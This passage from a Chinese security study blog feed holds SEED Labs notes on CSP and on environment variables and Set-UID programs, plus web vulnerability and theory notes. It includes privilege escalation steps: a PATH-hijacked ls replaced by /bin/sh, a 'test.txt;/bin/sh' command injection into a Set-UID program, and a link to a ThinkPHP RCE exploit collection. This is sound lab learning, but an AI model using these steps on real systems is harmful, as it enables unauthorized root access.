/><figcaption aria-hidden="true">image-20231031194908558</figcaption></figure></li><li><p>修改PHP代码.进入./Labsetup/image_www/csp/phpindex.php，增加条目*.example60.com和'nonce-222-222-222'.重建镜像，启动容器.打开example32c.com，区域1，2，4，5，6显示OK.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952921.png"alt="image-20231031195026156" /><figcaption aria-hidden="true">image-20231031195026156</figcaption></figure></li><li><p>CSP（Content Security Policy）:</p><ul><li>限制脚本来源：CSP允许网页所有者指定哪些域名可以提供脚本代码，而哪些不可以.这意味着只有从经过信任验证的来源加载的脚本代码才会被执行，其他来源的脚本将被阻止.这减少了攻击者注入恶意脚本的机会，因为它们的来源不会被信任.</li></ul><ol start="2" type="1"><li>禁止内联脚本：CSP允许网页所有者禁用内联脚本（嵌入在HTML代码中的脚本），这对于XSS攻击来说是一个常见的攻击向量.禁止内联脚本意味着攻击者无法在网页中注入恶意脚本代码.</li><li>禁止动态代码执行：CSP可以阻止动态生成的脚本代码的执行，这可以防止XSS攻击中常见的恶意脚本注入.只有从受信任的来源加载的脚本才能执行.</li><li>报告机制：CSP提供了一个报告机制，可以将违反策略的尝试报告给网页所有者，使其能够了解潜在的攻击尝试.这有助于及时识别和应对潜在的XSS攻击.</li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>SEED-LABS</category>
      
      <category>Web Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH05-IDA Pro</title>
    <link href="/2023/10/29/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/05IDA%20Pro/"/>
    <url>/2023/10/29/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/05IDA%20Pro/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>知识框架</title>
    <link href="/2023/10/27/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E7%9F%A5%E8%AF%86%E6%A1%86%E6%9E%B6/%E7%9F%A5%E8%AF%86%E6%A1%86%E6%9E%B6/"/>
    <url>/2023/10/27/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E7%9F%A5%E8%AF%86%E6%A1%86%E6%9E%B6/%E7%9F%A5%E8%AF%86%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透测试工具使用">1. 渗透测试工具使用</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310271359505.png"alt="image-20231027091354324" /><figcaption aria-hidden="true">image-20231027091354324</figcaption></figure><h1 id="信息收集">2. 信息收集</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101403241.png"alt="image-20231110140312361" /><figcaption aria-hidden="true">image-20231110140312361</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>知识框架</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>漏洞(合集)</title>
    <link href="/2023/10/25/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E(%E5%90%88%E9%9B%86)/"/>
    <url>/2023/10/25/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E(%E5%90%88%E9%9B%86)/</url>
    
    <content type="html"><![CDATA[<h1 id="phps文件">1. phps文件</h1><p>phps文件就是php的<strong>源代码文件</strong>，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容.因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替.其实，只要不用php等已经在服务器中注册过的MIME类型的文件扩展名即可，但为了国际通用，所以才用了phps文件类型.</p><h1 id="robots协议">2. Robots协议</h1><ul><li><code>robots.txt</code>文件被网络爬虫用来检查是否允许它们抓取和索引该网站，或者只允许抓取和索引网站的部分内容.有时，这些文件会暴露<strong>目录结构</strong>，而不是保护内容不被抓取.</li><li>存放目录：<code>robots.txt</code>文件必须要存放在网站的根目录下，即通过<code>域名/robots.txt</code>可以访问此文件.</li></ul><h1 id="xff_referer">3. xff_referer</h1><ul><li>X-Forward-For（xff）：客户端连接到网页的ip</li><li>referer：客户从哪个网页来访问的当前页面</li></ul><h1 id="备份文件">4. 备份文件</h1><p>常见的备份文件后缀名有:<code>.git .svn .swp .svn .~ .bak .bash_history</code></p><h1 id="php弱类型">5. php弱类型</h1><table><thead><tr class="header"><th>例子</th><th>名称</th><th>结果</th></tr></thead><tbody><tr class="odd"><td>$a == $b</td><td>等于</td><td><strong><code>true</code></strong>，如果类型转换后 $a 等于 $b。</td></tr><tr class="even"><td>$a === $b</td><td>全等</td><td><strong><code>true</code></strong>，如果 $a 等于$b，并且它们的类型也相同。</td></tr></tbody></table><p>注：如果一个数值和字符串进行比较的时候，会将字符串转换成数值.当一个字符串被当作一个数值来取值，其结果和类型如下:如果该字符串没有包含<code>'.','e','E'</code>并且其数值在整型的范围之内该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0.</p><p><strong>相关内容：</strong></p><ul><li><code>is_numeric()</code>函数会判断如果是数字和数字字符串则返回TRUE，否则返回 FALSE</li><li><code>array_search()</code>函数在数组中查找元素，并返回下标，但查找过程使用了弱类型比较</li><li>低版本php中科学计数法长度按字符串来算</li></ul><h1 id="thinkphp-5.x">6. ThinkPHP 5.x</h1><p>前言：ThinkPHP官方2018年12月9日发布重要的安全更新，修复了一个严重的远程代码执行漏洞.该更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本.</p><p>利用：https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</p>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Environment_Variable_and_SetUID</title>
    <link href="/2023/10/25/SEED-LABS/Software%20Security/Environment_Variable_and_SetUID/"/>
    <url>/2023/10/25/SEED-LABS/Software%20Security/Environment_Variable_and_SetUID/</url>
    
    <content type="html"><![CDATA[<h1 id="overview">1. Overview</h1><ul><li>本实验的学习目标是让学生了解环境变量如何影响程序和系统行为.环境变量是一组动态命名值，可影响运行进程在计算机上的行为方式.自1979 年 Unix引入环境变量以来，大多数操作系统都在使用它们.尽管环境变量会影响程序行为，但许多程序员并不十分了解它们是如何实现这一目标的.因此，如果程序使用了环境变量，但程序员并不知道使用了环境变量，程序就可能存在漏洞.</li><li>在本实验室中，学生将了解环境变量的工作原理、环境变量如何从父进程传播到子进程，以及环境变量如何影响系统/程序行为.我们尤其感兴趣的是环境变量如何影响Set-UID 程序的行为，这些程序通常是特权程序.本实验室涵盖以下主题：<ul><li>环境变量</li><li>设置 UID 程序</li><li>安全调用外部程序</li><li>能力泄露</li><li>动态加载器/链接器</li></ul></li></ul><h1 id="lab-tasks">2. Lab Tasks</h1><h2 id="task-1-manipulating-environment-variables">2.1 Task 1:Manipulating Environment Variables</h2><ol type="1"><li><p>使用<code>printenv</code>或<code>env</code>命令打印出环境变量.对于特定的环境变量，如PWD，可以使用<code>printenv PWD</code>或<code>env | grep PWD</code>.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015240.png"alt="image-20231025094609055" /><figcaption aria-hidden="true">image-20231025094609055</figcaption></figure></li><li><p>使用 export 和 unset设置或取消设置环境变量.需要注意的是，这两条命令并不是独立的程序；它们是Bash 的两个内部命令，即在 Bash 之外无法找到它们.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015241.png"alt="image-20231025094645788" /><figcaption aria-hidden="true">image-20231025094645788</figcaption></figure></li></ol><h2id="task-2-passing-environment-variables-from-parent-process-to-child-process">2.2Task 2: Passing Environment Variables from Parent Process to ChildProcess</h2><ol type="1"><li><p>每个程序都有一个环境表，它是一个字符指针数组，其中每个指针包含一个以NULL结尾的C字符串的地址.全局变量environ则包含了该指针数组的地址.fork()函数会通过系统调用创建一个与父进程几乎完全相同的子进程，fork()函数会有两个返回值，在父进程中返回子进程的ID；在子进程中返回0，若出现错误则返回一个负值.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// myprintenv.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> **environ;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">printenv</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> (environ[i] != <span class="hljs-literal">NULL</span>) &#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, environ[i]);<br>     i++;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">pid_t</span> childPid;<br>  <span class="hljs-keyword">switch</span>(childPid = fork()) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:  <span class="hljs-comment">/* child process */</span><br>      printenv();          <br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">default</span>:  <span class="hljs-comment">/* parent process */</span><br>      <span class="hljs-comment">//printenv();       </span><br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>编译运行myprintenv.c，并将输出结果保存到child_env，输出打印了子进程的环境变量.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015242.png"alt="image-20231025094953836" /><figcaption aria-hidden="true">image-20231025094953836</figcaption></figure></li><li><p>注释掉子进程情况下的 printenv() 语句，取消注释父进程情况下的的printenv()语句.再次编译并运行代码，并将输出保存到parent_env，输出打印了父进程的环境变量.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015243.png"alt="image-20231025095016365" /><figcaption aria-hidden="true">image-20231025095016365</figcaption></figure></li><li><p>使用 diff命令比较这两个文件的差异，发现两个文件完全相同.<strong>结论：如果使用fork()创建了一个新进程，则子进程将继承其父进程的环境变量.</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015244.png"alt="image-20231025095039820" /><figcaption aria-hidden="true">image-20231025095039820</figcaption></figure></li></ol><h2 id="task-3-environment-variables-and-execve">2.3 Task 3: EnvironmentVariables and execve()</h2><ol type="1"><li><p>函数 execve()通过系统调用加载新命令并执行该命令；该函数永远不会返回，不会创建新进程；相反，调用进程的文本、数据、bss和堆栈会被所加载程序的文本、数据、bss 和堆栈覆盖.本质上，execve()在调用进程中运行新程序.</p></li><li><p>execve()函数原型：filename:准备载入当前进程空间的新程序的路径名.既可以是绝对路径，又可以是相对路径.argv[]:指定了传给新程序的命令行参数，该数组对应于c语言main函数的argv参数数组，格式也相同，argv[0]对应命令名，通常情况下该值与filename中的basename(就是绝对路径的最后一个)相同.envp[]:最后一个参数envp指定了新程序的环境列表.参数envp对应于新程序的environ数组.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015245.png"alt="image-20231025095130506" /><figcaption aria-hidden="true">image-20231025095130506</figcaption></figure></li><li><p>编译运行myenv.c，没有任何输出，说明新程序没有任何环境变量.将execve("/usr/bin/env",argv, NULL)语句修改为execve("/usr/bin/env", argv,environ)，发现可以打印出环境变量.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015246.png"alt="image-20231025095202720" /><figcaption aria-hidden="true">image-20231025095202720</figcaption></figure></li><li><p><strong>结论：如果进程使用execve()启动一个新程序，在此场景中内存空间被覆盖，所有旧环境变量将丢失，需要通过envp参数传递环境变量.</strong></p></li></ol><h2 id="task-4-environment-variables-and-system">2.4 Task 4: EnvironmentVariables and system()</h2><ol type="1"><li><p>system函数用于执行命令，但与直接执行命令的 execve()不同，system() 实际上是执行"/bin/sh -c 命令"，即调用/bin/sh，并要求shell 执行命令.函数实现: 它使用 execl()执行 /bin/sh；execl() 调用execve()，将环境变量数组传递给它.</p></li><li><p>编译运行system.c，输出了环境变量</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015247.png"alt="image-20231025095339373" /><figcaption aria-hidden="true">image-20231025095339373</figcaption></figure></li><li><p><strong>结论：使用system()执行命令，调用进程的环境变量会传递给新程序/bin/sh.</strong></p></li></ol><h2 id="task-5-environment-variable-and-set-uid-programs">2.5 Task 5:Environment Variable and Set-UID Programs</h2><ol type="1"><li><p>Set-UID 是 Unix 操作系统中的一种重要安全机制.当 Set-UID程序运行时，它将拥有所有者的权限.例如，如果程序的所有者是root，那么当任何人运行该程序在执行过程中就会获得 root 的权限.</p></li><li><p>编译foo.c，将其所有权更改为 root，并使其成为 Set-UID 程序.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015248.png"alt="image-20231025095516474" /><figcaption aria-hidden="true">image-20231025095516474</figcaption></figure></li><li><p>设置环境变量：PATH:可执行文件的搜索路径；LD_LIBRARY_PATH:程序编译期间查找动态链接库时指定的查找共享库的路径.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015249.png"alt="image-20231025095542115" /><figcaption aria-hidden="true">image-20231025095542115</figcaption></figure></li><li><p>运行程序. 发现PATH和ANYNAME进入了子进程，LD_LIBRARY_PATH没有进入子进程.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015251.png"alt="image-20231025095601892" /><figcaption aria-hidden="true">image-20231025095601892</figcaption></figure></li><li><p><strong>结论：动态链接器实现了一个对策，当EUID和RUID不同时，它会忽略LD_PRELOAD和LD_LIBRARY_PATH环境变量.</strong></p></li></ol><h2 id="task-6-the-path-environment-variable-and-set-uid-programs">2.6Task 6: The PATH Environment Variable and Set-UID Programs</h2><ol type="1"><li><p>将目录 /home/seed添加到PATH环境变量的开头，因为寻找可执行文件时优先从靠前的路径中查找.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015252.png"alt="image-20231025095649662" /><figcaption aria-hidden="true">image-20231025095649662</figcaption></figure></li><li><p>编译ls.c，将其所有者改为 root，并使其成为 Set-UID 程序.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015253.png"alt="image-20231025095711599" /><figcaption aria-hidden="true">image-20231025095711599</figcaption></figure></li><li><p>创建myls.c，编译为ls,需要放在/home/seed路径下,以便执行system(“ls”)时能够优先找到我们自己编写的ls.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015254.png"alt="image-20231025095731936" /><figcaption aria-hidden="true">image-20231025095731936</figcaption></figure></li><li><p>执行程序，成功执行了我们自定义的ls命令.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015255.png"alt="image-20231025095755860" /><figcaption aria-hidden="true">image-20231025095755860</figcaption></figure></li><li><p>获取具有root权限的shell: 将/bin/sh拷贝为/home/seed目录下的ls，执行程序，成功得到root权限的shell.因为执行Set-UID程序时，会临时获得root权限，所以得到的是root权限的shell.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015256.png"alt="image-20231025095816376" /><figcaption aria-hidden="true">image-20231025095816376</figcaption></figure></li><li><p><strong>结论：与system()相比，execve()的攻击面更小.execve()不调用shell，因此不受环境变量的影响.当在特权程序中调用外部程序时，我们应该使用execve().</strong></p></li></ol><h2id="task-7-the-ld-preload-environment-variable-and-set-uid-programs">2.7Task 7: The LD PRELOAD Environment Variable and Set-UID Programs</h2><ol type="1"><li><p>基本知识：LD_开头的环境变量会影响动态链接器/加载器的行为；fPIC：Generateposition-independent code(PIC)，意味着生成的机器代码不依赖于位于特定的地址.</p></li><li><p>建立一个动态链接库.创建以下程序，并将其命名为 mylib.c，用于覆盖libc 中的 sleep() 函数.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015257.png"alt="image-20231025100014757" /><figcaption aria-hidden="true">image-20231025100014757</figcaption></figure></li><li><p>编译上述程序</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015258.png"alt="image-20231025100035694" /><figcaption aria-hidden="true">image-20231025100035694</figcaption></figure></li><li><p>设置LD PRELOAD环境变量</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015259.png"alt="image-20231025100100645" /><figcaption aria-hidden="true">image-20231025100100645</figcaption></figure></li><li><p>创建并编译myprog.c</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015260.png"alt="image-20231025100118206" /><figcaption aria-hidden="true">image-20231025100118206</figcaption></figure></li><li><p>运行程序</p><ul><li><p>将 myprog 设为普通程序，并以普通用户身份运行. 成功打印LDPRELOAD环境变量，执行自定义函数，说明环境变量生效.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015261.png"alt="image-20231025100244606" /><figcaption aria-hidden="true">image-20231025100244606</figcaption></figure></li><li><p>将 myprog 设为 Set-UID root 程序，并以普通用户身份运行.没有打印LD PRELOAD环境变量，程序睡眠一秒，说明该环境变量被忽略.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015262.png"alt="image-20231025100251936" /><figcaption aria-hidden="true">image-20231025100251936</figcaption></figure></li><li><p>将 myprog 设置为 Set-UID root 程序，在 root 账户中再次导出 LDPRELOAD 环境变量，然后运行它.成功打印LDPRELOAD环境变量，执行自定义函数，说明环境变量生效.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015263.png"alt="image-20231025100258347" /><figcaption aria-hidden="true">image-20231025100258347</figcaption></figure></li><li><p>将 myprog 设置为 Set-UID xukaiyu 程序（即所有者为xukaiyu，也就是另一个用户账户）、在另一个用户账户（seed）中再次导出 LDPRELOAD 环境变量，然后运行它. 没有打印LDPRELOAD环境变量，程序睡眠一秒，说明该环境变量被忽略.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015264.png"alt="image-20231025100306718" /><figcaption aria-hidden="true">image-20231025100306718</figcaption></figure></li></ul></li><li><p><strong>结论：只有EUID和RUID相同时，LDPRELOAD环境变量才能生效.也就是说，只有用户自己创建的程序自己去运行，才会使用LD_PRELOAD环境变量，重载sleep函数，否则的话会忽略LD_PRELOAD环境变量，不会重载sleep函数.</strong></p></li></ol><h2id="task-8-invoking-external-programs-using-system-versus-execve">2.8Task 8: Invoking External Programs Using system() versus execve()</h2><ol type="1"><li><p>编译catall.c，使其成为根用户所有的 Set-UID 程序.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015265.png"alt="image-20231025100352901" /><figcaption aria-hidden="true">image-20231025100352901</figcaption></figure></li><li><p>切换到root用户，创建test.txt文件.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015266.png"alt="image-20231025100414003" /><figcaption aria-hidden="true">image-20231025100414003</figcaption></figure></li><li><p>切换回seed用户.直接删除test.txt文件，无法成功.通过catall程序进行删除，命令参数为“test.txt;/bin/sh”，得到一个root权限的shell，成功删除.注：要同时在命令行执行两个命令，可以用”;”来进行分割.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015267.png"alt="image-20231025100445291" /><figcaption aria-hidden="true">image-20231025100445291</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015268.png"alt="image-20231025100451817" /><figcaption aria-hidden="true">image-20231025100451817</figcaption></figure></li><li><p>注释掉 system(command) 语句，取消对 execve()语句的注释；程序将使用 execve()调用命令.编译程序，并将其作为根用户所有的 Set-UID 程序.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015269.png"alt="image-20231025100526231" /><figcaption aria-hidden="true">image-20231025100526231</figcaption></figure></li><li><p>再次进行前面步骤中的攻击，发现无法得到一个root权限的shell，从而不能成功攻击.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015270.png"alt="image-20231025100542023" /><figcaption aria-hidden="true">image-20231025100542023</figcaption></figure></li></ol><h2 id="task-9-capability-leaking">2.9 Task 9: Capability Leaking</h2><ol type="1"><li><p>目标：以普通用户身份写入 /etc/zzz 文件</p></li><li><p>以管理员身份创建文件/etc/zzz</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015271.png"alt="image-20231025100646131" /><figcaption aria-hidden="true">image-20231025100646131</figcaption></figure></li><li><p>编译cap leak.c，将其所有者改为 root，并使其成为 Set-UID 程序.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015272.png"alt="image-20231025100619844" /><figcaption aria-hidden="true">image-20231025100619844</figcaption></figure></li><li><p>虽然代码中调用了setuid(getuid())，试图降低特权，但并没有完全清除特权.程序打开文件后并没有关闭文件，并且输出了文件描述符，所以我们仍然可以成功写/etc/zzz.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015273.png"alt="image-20231025100714076" /><figcaption aria-hidden="true">image-20231025100714076</figcaption></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>SEED-LABS</category>
      
      <category>Software Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH4-软件漏洞-环境变量</title>
    <link href="/2023/10/25/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/%E7%90%86%E8%AE%BA%E7%AF%87/04%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"/>
    <url>/2023/10/25/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/%E7%90%86%E8%AE%BA%E7%AF%87/04%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="基础知识">1. 基础知识</h1><h2 id="环境变量">1.1 环境变量</h2><ul><li>一组动态的定义值</li><li>操作系统运行环境的一部分</li><li>影响正在运行进程的行为方式（加载哪些外部DLL）</li><li>在Unix中提出，也被微软操作系统采用</li><li>示例：PATH变量.当执行一个程序时，如果没有提供完整的路径，shell进程将使用环境变量来找到程序的位置.</li></ul><h2 id="环境变量的内存位置">1.2 环境变量的内存位置</h2><ul><li><p>envp和environ最初指向同一个地方</p></li><li><p>envp只能在主函数中可访问，而 environ 是一个全局变量</p></li><li><p>当对环境变量进行更改时（例如添加新变量），存储环境变量的位置可能会移动到堆中，因此environ将发生更改（envp不会更改）</p></li><li><p>添加或删除环境变量或修改现有变量的值，1和2中没有足够的空间。在这种情况下，整个环境变量块可能会更改到不同的位置（通常是在堆中）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310250937981.png"alt="image-20231025085558964" /><figcaption aria-hidden="true">image-20231025085558964</figcaption></figure></li></ul><h2 id="c语言访问环境变量">1.3 C语言访问环境变量</h2><ol type="1"><li>从主函数中访问：<code>void main(int argc, char* argv[], char* envp[])</code></li><li>使用全局变量：<code>extern char** environ</code></li></ol><h2 id="进程获取环境变量">1.4 进程获取环境变量</h2><ol type="1"><li>如果使用<code>fork()</code>创建了一个新进程，子进程继承父进程的环境变量</li><li>如果进程使用<code>execve()</code>启动一个新程序，在此场景中内存空间被覆盖，所有旧环境变量将丢失.通过参数<code>envp</code>传递环境变量<code>int execve(const char* filename, char* const argv[], char* const envp[])</code></li></ol><h2 id="shell命令变量和环境变量">1.5 shell命令变量和环境变量</h2><ul><li><p>shell命令变量和环境变量不相同</p></li><li><p>shell命令变量是shell使用的内部变量.shell提供了内置命令，允许用户创建、分配和删除Shell变量</p></li><li><p>当shell程序启动时，它会将环境变量复制到自己的shell变量中.shell变量所做的更改将不会反映出在环境变量上.但是exported后的shell变量可以传到子进程.</p></li><li><p>当我们在shell提示符中输入env时，shell将创建一个子进程</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310250937982.png"alt="image-20231025090223045" /><figcaption aria-hidden="true">image-20231025090223045</figcaption></figure></li></ul><h2 id="set-uid">1.6 Set-UID</h2><ul><li>Set-UID 是 Unix 操作系统中的一种重要安全机制.当 Set-UID程序运行时，它将拥有所有者的权限.例如，如果程序的所有者是root，那么当任何人运行该程序在执行过程中就会获得 root 的权限.</li><li>设置后效果：原本表示文件所有者权限中的 x 权限位，却出现了 s权限，此种权限通常称为 SetUID，简称 SUID 特殊权限</li><li>每个进程都有两个用户ID<ul><li>Real UID (RUID):确定进程的真正所有者</li><li>Effective UID (EUID): 标识进程的权限</li></ul></li><li>当执行正常程序时 , RUID = EUID,它们都等于运行程序的用户的ID；当执行Set-UID时, RUID ≠ EUID.RUID还是运行程序的用户 ID, 但是 EUID 是程序 owner的 ID.</li></ul><h1 id="环境变量攻击">2. 环境变量攻击</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310250937983.png"alt="image-20231025090642033" /><figcaption aria-hidden="true">image-20231025090642033</figcaption></figure><h2 id="通过动态链接器攻击">2.1 通过动态链接器攻击</h2><ul><li><p>静态链接：包含程序代码和涉及的外部库的代码（编译出的程序较大）</p></li><li><p>动态链接：在运行使用动态链接编译的程序之前，首先将其可执行文件加载到内存.加载到内存中后，加载器将控制件传递给动态链接器，链接器为共享库找到外部库的实现.一旦链接完成，控制将提供给main()</p></li><li><p>可以使用<code>ldd</code>命令来查看程序依赖于什么共享库</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310250937984.png"alt="image-20231025091306026" /><figcaption aria-hidden="true">image-20231025091306026</figcaption></figure></li></ul><p><strong>攻击方式：</strong></p><ul><li>LD_PRELOAD 包含一个共享库的列表，链接器将首先搜索它；</li><li>如果没有找到所有函数，链接器将在几个文件夹列表中搜索，包括LD_LIBRARY_PATH指定的文件夹；</li><li>这两个变量都可以由用户设置，因此使他们有机会控制链接过程结果.例：用户创建一个共享库(如实现自己的sleep函数)，并将共享库添加到LD_PRELOAD环境变量首位.执行调用sleep函数的程序时，执行的sleep函数为用户自定义的函数.</li><li>如果该程序是一个Set-UID程序，它可能会导致安全漏洞.当EUID≠RUID时，动态链接器会忽略LD_PRELOAD和LD_LIBRARY_PATH</li></ul><h2 id="通过外部程序攻击">2.2 通过外部程序攻击</h2><ul><li><p>应用程序可以调用外部程序.应用程序本身可能不使用环境变量，但被调用的外部程序可能会使用.</p></li><li><p>调用外部程序：</p><ul><li>exec()函数家族，它们以不同的形式调用execve，直接运行程序.</li><li>system()，先调用execl()，execl()最终调用execve()运行/bin/sh，然后通过shell运行程序.shell程序会继承环境变量.</li></ul></li><li><p>操作PATH变量进行攻击：shell运行命令而没有提供绝对路径时，它将使用PATH变量来找到该命令.</p></li><li><p>例：正常的程序(vul.c)中存在<code>system("cal");</code>，通过操作路径变量，使shell将cal命令定位到自定义的cal程序(攻击者可在这个程序中继承环境变量，以root权限执行其他命令)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chown</span> root vul.o<br>sudo <span class="hljs-built_in">chmod</span> 4755 vul.o<br>gcc cal.c -o cal<br><span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><span class="hljs-comment"># 将当前路径添加到PATH变量中</span><br>./vul.o<br></code></pre></td></tr></table></figure></li><li><p>当在特权程序中调用外部程序时，应该使用execve()，不调用shell，因此不受环境变量的影响.</p></li></ul><h2 